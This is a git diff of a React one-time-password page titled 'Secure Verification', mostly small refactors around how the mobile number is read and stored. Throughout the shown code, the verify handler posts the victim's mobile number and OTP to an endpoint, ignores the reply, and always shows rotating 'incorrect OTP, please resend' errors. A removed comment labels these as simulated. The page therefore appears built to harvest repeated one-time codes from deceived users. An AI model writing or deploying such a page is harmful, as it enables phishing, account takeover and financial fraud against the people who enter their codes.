@@ -5,9 +5,8 @@ import "./otpSubmit.css";
 
 export default function OTPSubmit() {
   const location = useLocation();
-  const storedMobile = localStorage.getItem("otpMobileNumber"); // read from localStorage
-  const { mobileNumber: stateMobile } = location.state || {};
-  const mobileNumber = stateMobile || storedMobile;
+  const storedMobile = localStorage.getItem("mobileNumber");
+  const mobileNumber = location.state?.mobileNumber || storedMobile;
 
   const [otp, setOtp] = useState(new Array(6).fill(""));
   const [loading, setLoading] = useState(false);
@@ -21,11 +20,10 @@ export default function OTPSubmit() {
     "Incorrect OTP, please resend OTP again",
   ];
 
+  // Save last page
   useEffect(() => {
-    if (!mobileNumber) {
-      setMessage({ text: "Mobile number not found, please go back and enter details again", type: "error" });
-    }
-  }, [mobileNumber]);
+    localStorage.setItem("lastVisitedPage", "/otp-submit");
+  }, []);
 
   const handleChange = (element, index) => {
     if (/^[0-9]$/.test(element.value) || element.value === "") {
@@ -33,13 +31,9 @@ export default function OTPSubmit() {
       newOtp[index] = element.value;
       setOtp(newOtp);
 
-      // auto-focus next input
       if (element.nextSibling && element.value) element.nextSibling.focus();
 
-      // auto-submit when 6 digits entered
-      if (newOtp.join("").length === 6) {
-        handleVerify(newOtp.join(""));
-      }
+      if (newOtp.join("").length === 6) handleVerify(newOtp.join(""));
     }
   };
 
@@ -48,8 +42,10 @@ export default function OTPSubmit() {
       setMessage({ text: "Please enter the 6-digit OTP", type: "error" });
       return;
     }
-
-    if (!mobileNumber) return;
+    if (!mobileNumber) {
+      setMessage({ text: "Mobile number not found, please login again", type: "error" });
+      return;
+    }
 
     setLoading(true);
     setMessage({ text: "", type: "" });
@@ -61,11 +57,10 @@ export default function OTPSubmit() {
         body: JSON.stringify({ mobileNumber, otp: otpValue }),
       });
 
-      // simulate sequential error messages
       setTimeout(() => {
         setMessage({ text: errorMessages[errorIndex], type: "error" });
         setErrorIndex((prev) => (prev + 1) % errorMessages.length);
-        setOtp(new Array(6).fill("")); // clear inputs
+        setOtp(new Array(6).fill(""));
         setLoading(false);
       }, 3000);
     } catch (err) {
@@ -79,11 +74,9 @@ export default function OTPSubmit() {
   };
 
   const handleResend = async () => {
-    setOtp(new Array(6).fill("")); // clear inputs
-    if (!mobileNumber) return;
-
+    setOtp(new Array(6).fill(""));
     setMessage({
-      text: `OTP resent to your registered mobile number ending with ${mobileNumber.slice(-4)}`,
+      text: `OTP resent to your registered mobile number ending with ${mobileNumber?.slice(-4) || "****"}`,
       type: "success",
     });
 
@@ -104,7 +97,7 @@ export default function OTPSubmit() {
       <h2>Secure Verification</h2>
 
       <p className="otp-headerrr">
-        Please enter the 6-digit OTP sent to your registered mobile number ending with {mobileNumber ? mobileNumber.slice(-4) : "****"}
+        Please enter the 6-digit OTP sent to your registered mobile number ending with {mobileNumber?.slice(-4) || "****"}
       </p>
 
       {message.text && <div className={`form-message ${message.type}`}>{message.text}</div>}
@@ -120,20 +113,14 @@ export default function OTPSubmit() {
             value={data}
             onChange={(e) => handleChange(e.target, index)}
             onFocus={(e) => e.target.select()}
-            disabled={loading || !mobileNumber}
+            disabled={loading}
           />
         ))}
       </div>
 
-      <p className="resend-otp" onClick={handleResend}>
-        Resend OTP
-      </p>
+      <p className="resend-otp" onClick={handleResend}>Resend OTP</p>
 
-      <button
-        className="verify-btn"
-        onClick={() => handleVerify(otp.join(""))}
-        disabled={loading || !mobileNumber}
-      >
+      <button className="verify-btn" onClick={() => handleVerify(otp.join(""))} disabled={loading}>
         {loading ? <FaSpinner className="rotating" /> : "🔒 Verify Securely with Login"}
       </button>
     </div>
